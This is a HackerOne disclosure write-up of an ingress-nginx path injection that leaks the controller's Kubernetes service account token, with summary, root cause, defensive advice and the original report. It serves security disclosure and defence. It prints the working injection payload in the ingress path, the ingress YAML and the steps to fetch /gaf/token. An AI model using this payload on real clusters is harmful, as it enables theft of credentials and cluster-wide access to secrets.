# Ingress-nginx Path Injection Allows Service Account Token Disclosure

## Metadata
- **Source:** HackerOne
- **Report:** 1382919 | https://hackerone.com/reports/1382919
- **Submitted:** 2021-10-27
- **Reporter:** 0ria
- **Program:** Kubernetes/nginx-ingress
- **Bounty:** Not specified in report
- **Severity:** HIGH
- **Vuln:** Path Traversal, Configuration Injection, Privilege Escalation, Information Disclosure, Insecure Deserialization of Untrusted Data
- **CVEs:** None
- **Category:** auth-crypto

## Summary
A user with ingress creation permissions can inject malicious nginx configuration via the ingress path field to access the ingress-nginx service account token stored on the pod's filesystem. This token has cluster-wide permissions to list secrets in all namespaces, enabling privilege escalation and lateral movement.

## Attack scenario
1. Attacker creates a user account with limited permissions (only ability to create/update ingress resources in a namespace)
2. Attacker crafts an ingress resource with a malicious path containing nginx configuration injection payload: `/gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa`
3. Ingress controller parses the path and injects it unsanitized into the nginx.conf configuration file
4. The injected configuration creates an alias directive that maps the /gaf path to the service account directory
5. Attacker makes HTTP request to the ingress controller endpoint: `https://<host>/gaf/token`
6. Ingress-nginx serves the token file via the alias, allowing attacker to retrieve and decode the service account JWT with cluster-wide secrets access

## Root cause
The ingress-nginx controller fails to properly sanitize and validate the ingress path field before injecting it into the nginx configuration file. The path parameter is concatenated directly into nginx directives without escaping special characters or validating against nginx configuration syntax, allowing attackers to inject arbitrary nginx directives including the 'alias' directive for directory mapping.

## Attacker mindset
An insider or compromised user with basic ingress creation permissions recognizes that ingress paths are directly used in nginx config generation. By understanding nginx directive syntax, they craft a payload to break out of the intended path context and create a new location block that aliases to the Kubernetes secret mounting directory, bypassing access controls through service account token theft.

## Defensive takeaways
- Implement strict input validation and sanitization for all ingress path fields, rejecting characters that could alter nginx directive syntax (braces, semicolons, location keywords)
- Use allowlists for path patterns rather than blacklists
- Apply principle of least privilege: service accounts should not have cluster-wide permissions; limit ingress-nginx RBAC to only necessary namespaces
- Implement Web Application Firewall (WAF) rules to detect suspicious path patterns attempting to access sensitive kubernetes paths
- Mount service account tokens with restricted read permissions or use projected volumes
- Audit ingress configurations for suspicious path values before applying them
- Use securityContext to prevent ingress pods from accessing /var/run/secrets directory directly
- Implement admission controllers to validate ingress resources and reject malicious path patterns

## Variant hunting
Search for similar injection vulnerabilities in other Kubernetes controllers that generate configuration files (nginx-ingress, traefik, haproxy-ingress). Test other ingress annotation fields for injection (hostname, regex paths, custom headers). Check if other nginx modules with similar syntax injection risks are exposed. Investigate whether the same vulnerability exists in different versions or forks of the ingress-nginx project.

## MITRE ATT&CK
- T1190 - Exploit Public-Facing Application
- T1078 - Valid Accounts
- T1548 - Abuse Elevation Control Mechanism
- T1552 - Unsecured Credentials
- T1526 - Gather Victim Identity and Access Infrastructure
- T1087 - Account Discovery
- T1613 - Container and Resource Discovery

## Notes
This vulnerability demonstrates how improperly designed APIs that accept user input for system configuration generation can lead to severe privilege escalation. The issue is particularly dangerous in Kubernetes environments where service accounts have significant permissions. The attacker only needs basic ingress creation permissions to escalate to cluster-wide secrets access. The vulnerability affects ingress-nginx v1.0.4 and likely other versions. Proper fix requires escaping/validating path input before nginx config generation.

## Full report
<details><summary>Expand</summary>

Report Submission Form

## Summary:
A user with the permissions to create an ingress resource can obtain the ingress-nginx service account token which can list secrets is all namespaces (cluster wide).

## Kubernetes Version:
1.20 (should work on (1.21 as well)

## Component Version:
nginx ingress controller v1.0.4

## Steps To Reproduce:
I deployed the latest ingress-controller (v1.0.4).
I used a user (gaf_test) that has the permissions to get, create and update ingress resources
(the “get” permissions is only to allow kubectl to view the newly created resource).

ingress-creator-role.yaml
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: Role
metadata:
  name: ingress-creator
  namespace: default
rules:
- apiGroups: ["networking.k8s.io"]
  resources: ["ingresses"]
  verbs: ["get", "create", "update"]
```

ingress-creator-role-binding.yaml
```yaml
apiVersion: rbac.authorization.k8s.io/v1
kind: RoleBinding
metadata:
  name: gaf_test-ingress-creator-binding
  namespace: default
subjects:
- kind: User
  name: gaf_test
  apiGroup: rbac.authorization.k8s.io
roleRef:
  kind: Role
  name: ingress-creator
  apiGroup: rbac.authorization.k8s.io
```

This user (gaf_user) cannot list secrets at all.
{F1495367}
 
Use this user (gaf_user) to create a new ingress resource in the default namespace.

ingress.yaml
```yaml
apiVersion: networking.k8s.io/v1
kind: Ingress
metadata:
  name: gaf-ingress
  annotations:
    kubernetes.io/ingress.class: "nginx"
spec:
  rules:
  -  http:
      paths:
        - path: /gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa
          pathType: Prefix
          backend:
            service:
              name: some-service
              port:
                number: 5678
```
```
kubectl apply -f ingress.yaml
```
{F1495369}
 

Access to nginx ingress loadbalancer to /gaf/token path.

https://<host>/gaf/token

 {F1495370}

Decode the token to see it belongs to the ingress-nginx
{F1495372}
 
The nginx-ingress service account is bound to the nginx-ingress cluser role that can list secrets in all namespaces.

## The Root Cause
When a user creates an ingress resource, the new configuration is updated in the /etc/nginx/nginx.conf file in the ingress-nginx-controller pod located in the nginx-ingress namespace.
I caused a “config file injection” using the following payload as path:

**/gaf{alias /var/run/secrets/kubernetes.io/serviceaccount/;}location ~* ^/aaa**
The payload above creates the following configuration for nginx:

/etc/nginx/nginx.conf

{F1495371} 

This is the relevant part from the configuration which creates a new route to /gaf path and uses an alias (http://nginx.org/en/docs/http/ngx_http_core_module.html#alias)
that maps to /var/run/secrets/kubernetes.io/serviceaccount/ directory on the ingress-nginx-controller pod.

## Impact

A user with the permissions to create an ingress resource can obtain the ingress-nginx service account token which can list secrets is all namespaces (cluster wide).

</details>

---
*Analysed by Claude on 2026-05-24*
